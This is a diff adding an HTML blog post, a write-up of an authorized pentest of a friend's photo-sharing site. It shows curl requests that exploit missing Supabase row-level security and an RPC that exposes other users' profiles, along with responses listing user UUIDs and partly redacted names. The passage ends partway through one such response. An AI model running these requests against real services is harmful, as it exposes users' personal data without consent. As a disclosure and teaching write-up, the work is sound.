@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cyberpunk nonsense and writeups">
+    
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" 
+          integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" 
+          integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    <link rel="stylesheet" href="/css/custom.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    
+    
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    
+    <title>
+        
+            Broken Access Control: The Lazarus Bug - lovd.app | Skelli
+        
+    </title>
+    
+    
+    <meta name="theme-color" content="#000000">
+</head> <body style="background-color: black; color: #d8e8ff;">
+    <div class="mainbg">
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <span class="terminal-title">Broken Access Control: The Lazarus Bug - lovd.app ~ warp</span>
+                <span class="terminal-controls">
+                    <span class="control"></span>
+                    <span class="control"></span>
+                    <span class="control"></span>
+                </span>
+            </div>
+            <div class="terminal-content">
+                <p class="terminal-prompt">skelli@macbook ~ % cd posts</p>
+                <p class="terminal-prompt">skelli@macbook ~/posts % cat broken-access-control-the-lazarus-bug-lovd.app.md</p>
+                
+                <div class="content-title">
+                    <h1>Broken Access Control: The Lazarus Bug - lovd.app</h1>
+                    
+                    <p class="terminal-date">February 13, 2026</p>
+                    
+                </div>
+                
+                <div class="content">
+                    <h1 id="too-long-didnt-read">Too Long, Didn&rsquo;t Read:</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"></code></pre></div><h1 id="the-preface">The Preface</h1>
+<p>I offer free pentests to friends, family, and budding developers or security professionals just setting up their websites and apps. It&rsquo;s good practice for me, and it benefits them. Not to mention, I almost always find something. This time was no different. I went to my friend&rsquo;s house on Wednesday. This is a ritual we do each week. We often catch up, play Silksong, discuss work, hobbies, everything. Y&rsquo;know, friend stuff. However, he asked me if I was willing to pentest his website for him, and I couldn&rsquo;t have been happier. So I made sure that I brought my laptop along to get started.</p>
+<p>It&rsquo;s been a few weeks since I had an engagement like this, so I came in with few expectations. My friend is an accomplished developer. He&rsquo;s a talented front-ender and aspiring backender. Fullstack is tough work, but he&rsquo;s doing it, and he&rsquo;s doing it well. He has a new job where he&rsquo;s learning the ins and outs of fullstack work, so for his hobby projects he thought he would try out vibecoding. This only heightened my excitement for the engagement. I&rsquo;m a good friend, and I did what any good friend would do: try to break into their database. Cue the technical content!</p>
+<h1 id="the-target">The Target</h1>
+<p><a href="https://www.lovd.app/">lovd.app</a> is a way to share and store your photos. It allows you to keep the photos you love - &ldquo;No ads, no doom scrolling, no randoms. Just a simple place to share what matters.&rdquo; It&rsquo;s a privacy-first, European-based social platform. It&rsquo;s inexpensive, it has a free tier and optionally you can pay for storage. I will be shamelessly plugging my friend&rsquo;s website, <a href="https://www.lovd.app/">lovd.app</a> because it IS a good website. My friend has put a lot of love and effort into it. Plus it was tested by yours truly, and will continue to be tested ;)</p>
+<h3 id="the-tech-stack">The Tech Stack</h3>
+<ul>
+<li>Nuxt.js / Nuxt UI</li>
+<li>Supabase</li>
+<li>Vue.js</li>
+<li>Mapbox GL JS</li>
+<li>Pinia and core-js JavaScript libraries</li>
+<li>HTTP/2</li>
+<li>Open Graph</li>
+<li>PWA</li>
+<li>PostgreSQL</li>
+<li>Vercel</li>
+<li>Tailwind CSS</li>
+<li>UnoCSS</li>
+</ul>
+<h1 id="the-discovery-phase">The Discovery Phase</h1>
+<p>I spun up my Burpsuite Pro, and set up my scan as per usual. I opened up my terminal, and began making cURL requests. (I can already hear the chorus of nerds shaming me for not using Burp for this part, but I like using cURL. Before I had a Burp Pro license, I was using cURL more than Burp. Old habits die hard.)</p>
+<p>While Burp was running I began searching for low hanging fruit. First I tried unauthenticated attacks, but there wasn&rsquo;t much attack surface there. So then I made a researcher account and began testing the various input fields I could control. I looked at the search function, various user-controlled parameters, upload fields.</p>
+<p>I looked for XSS, XXE, everything really. I wasn&rsquo;t finding any of the fun low hanging fruit. Though, to be fair, my partner did pentest this before I did, so I&rsquo;m sure he would&rsquo;ve caught that (and he did catch an XSS!). I didn&rsquo;t let that get to me, it was the first few minutes of the pentest after all.</p>
+<p>However, in the JavaScript I noticed there were some API endpoints. I found references to Supabase, GraphQL, and other interesting endpoints. So I began probing for more, and my resilience paid off.</p>
+<h2 id="the-first-death">The First Death</h2>
+<p>Supabase auto-generates REST endpoints for every table. I started with the obvious one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=email,first_name,last_name&#34;</span> 
+</span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&#34;</span> 
+</span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Authorization: Bearer [MY_TOKEN]&#34;</span>
+</span></span></code></pre></div><p>The response?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;asd&#34;</span>},
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>},
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;researcher@skelli.win&#34;</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;Eden&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;Stroet&#34;</span>},
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ... 25 more users
+</span></span></span></code></pre></div><p>The problem? No Row-Level Security (RLS). Supabase is permissive by
+default. So I turned to my friend and said: &ldquo;Found something. It&rsquo;s bad.&rdquo;</p>
+<h3 id="the-collection-association-attack">The Collection Association Attack</h3>
+<p>While digging deeper, I found something even more interesting - an RPC
+function called <code>add_person_to_collection</code>. You could add ANY user to YOUR collection. Without their consent. Then query <code>get_visible_people</code> and extract their full profile.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Add victim to your collection</span>
+</span></span><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/rpc/add_person_to_collection&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [TOKEN]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;p_collection_id&#34;:&#34;YOUR_ID&#34;,&#34;p_user_id&#34;:&#34;VICTIM_ID&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Get their data</span>
+</span></span><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/rpc/get_visible_people&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: [KEY]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer [TOKEN]&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;p_collection_ids&#34;:[&#34;YOUR_ID&#34;]}&#39;</span>
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;d4425e38-0c27-4e20-aff3-f36e961c97d5&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;My&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;Friend&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;MyFriend&#39;sEmail@gmail.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;handle&#34;</span>: <span style="color:#e6db74">&#34;Friend&#39;sUsername&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;profile_picture&#34;</span>: <span style="color:#e6db74">&#34;https://...&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Full PII. Email, name, handle, profile picture. Mouth-watering stuff, really. I showed him these writeups, and he immediately began working on a patch. I kept digging and found:</p>
+<p><strong>Debug function in production:</strong> <code>test_rls_condition</code> - a testing
+function that validates user IDs. Great for enumeration.</p>
+<p><strong>Unauthenticated RPC:</strong> <code>accrue_read_only_access</code> - could modify ANY
+user&rsquo;s subscription data. No auth required.</p>
+<p><strong>GraphQL introspection:</strong> Full schema exposed. 82 mutations, 20+ tables,
+complete database structure visible.</p>
+<p><strong>Broken RLS policy:</strong> The <code>family_members</code> table had a recursive policy
+causing infinite loops. PostgreSQL error 42P17 exposed in responses.</p>
+<p>This pentest was quite addictive if I&rsquo;m being honest. I was originally planning to return home by 23:00 like I usually do, but I got so deep into it, I felt that spark, that adrenaline rush kick in when you find something and you don&rsquo;t want to stop digging despite literally falling asleep at your keyboard. I kept going until almost 2AM, and I documented everything and sent the full report right before I left.</p>
+<h2 id="the-first-fix">The First &ldquo;Fix&rdquo;</h2>
+<p>I know my friend was working all night on these fixes. It&rsquo;s how he is. He takes pride in his work, and it shows. He also takes security seriously. That also was very evident to me, because the minute I&rsquo;d show any excitement towards my screen, we were both glued, and then he&rsquo;d groan, grab his laptop, and immediately start patching.</p>
+<p>Good security practice - rotating keys after a disclosure. I tested the fix.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://gjviaurdgmizalzsvguy.supabase.co/rest/v1/users?select=email,first_name,last_name&amp;limit=28&#34;</span>
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#66d9ef">null</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;asd&#34;</span>},
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#66d9ef">null</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>},
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#66d9ef">null</span>, <span style="color:#f92672">&#34;first_name&#34;</span>: <span style="color:#e6db74">&#34;Eden&#34;</span>, <span style="color:#f92672">&#34;last_name&#34;</span>: <span style="color:#e6db74">&#34;Stroet&#34;</span>},
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// ... 25 more
+</span></span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>The emails were gone. Progress!</p>
+<p>But the names were still there. All 28 users, full names visible.</p>
+<p>He&rsquo;d hidden the <code>email</code> column but forgot that <code>first_name</code> and <code>last_name</code> are PII too. More importantly: I could still see everyone&rsquo;s rows. He&rsquo;d masked one field but hadn&rsquo;t fixed the access control.</p>
+<h3 id="the-problem-column-vs-row-level-security">The Problem: Column vs Row Level Security</h3>
+<p><strong>What he did:</strong> Column-level hiding</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- Hide the email column (simplified)
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">REVOKE</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">ON</span> users.email <span style="color:#66d9ef">FROM</span> authenticated;
+</span></span></code></pre></div><p><strong>What he needed:</strong> Row-level security</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- Users can only see their own row
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> POLICY <span style="color:#e6db74">&#34;users_select&#34;</span> <span style="color:#66d9ef">ON</span> users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FOR</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">USING</span> (user_id <span style="color:#f92672">=</span> auth.uid());
+</span></span></code></pre></div><p>I took a small break on Thursday, mostly because I was working, and partly because I was so tired since I had gone to sleep around 4AM at that point, and woke up at 9AM for work. As I&rsquo;m writing this, today is Friday, and the testing has resumed.</p>
+<h2 id="the-second-death">The Second Death</h2>
+<p>On Wednesday night there were a few patches and a few bypasses. I thought today, why not try my luck with Yet Another Bypass? Lo and behold, my bypass worked.</p>
+<p>I texted my friend on Telegram:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=first_name&amp;limit=5&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: REDACTED&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer REDACTED&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}]<span style="color:#960050;background-color:#1e0010">%</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=handle&amp;limit=5&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: REDACTED&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer REDACTED &#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#66d9ef">null</span>}]<span style="color:#960050;background-color:#1e0010">%</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=last_name&amp;limit=5&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey: REDACTED&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer REDACTED&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;asd&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}]<span style="color:#960050;background-color:#1e0010">%</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># # Get first_name + last_name + user_id together</span>
+</span></span><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=user_id,first_name,last_name&amp;limit=28&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;apikey:REDACTED&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer REDACTED&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;f4ba0d38-3ad0-47f8-b5e3-2472c24432ef&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;asd&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;d0314f0c-ae3d-4258-890d-b2898bfb493d&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;dcf8bed6-1cb4-41a2-8d78-3c957c45faab&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;e6c56ea6-5843-4886-90dd-b7382bdc9acc&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;fdfed90d-8f57-44ea-8c3e-7f859047bf15&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;1c36054a-d0e0-4af4-9bf4-0a1aaf5a7548&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;f08b98ef-db13-4c69-ae63-bfdd12c7c5a5&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;e2464e04-bbc7-443a-addf-ae9ec312f453&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;ce7d4573-f794-4b12-bc6f-70fe7284d922&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;1f8ba5e0-3211-4e48-b145-218384e323d8&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;ada9648b-4540-4176-b0ae-63f801830767&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;b4c92379-09f2-465d-9dc0-65a871586e5a&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;d4425e38-0c27-4e20-aff3-f36e961c97d5&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;34791113-a7c9-45ab-bb39-b47d93b4c73d&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;Eden&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;Stroet&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;840b7552-90d4-4a38-b95b-206e12a0380c&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;c3a16de1-ede2-425a-a29d-7fa8ecb5e823&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#66d9ef">null</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;c24c932b-92b4-4c3c-87dc-411245842758&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;Testy&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;Testical&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;a7826f10-fe19-4ab4-a3d2-8ce97bff7153&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#66d9ef">null</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#66d9ef">null</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;845859d3-fca9-4b7c-bafc-287a11c0650b&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;Toaster&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;Tester&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;f5c9a3a9-4c5e-4e06-abe6-8b15a7c0d30b&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;72079a20-2198-4313-bd8f-85a6fd61cfa6&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#66d9ef">null</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#66d9ef">null</span>}, 
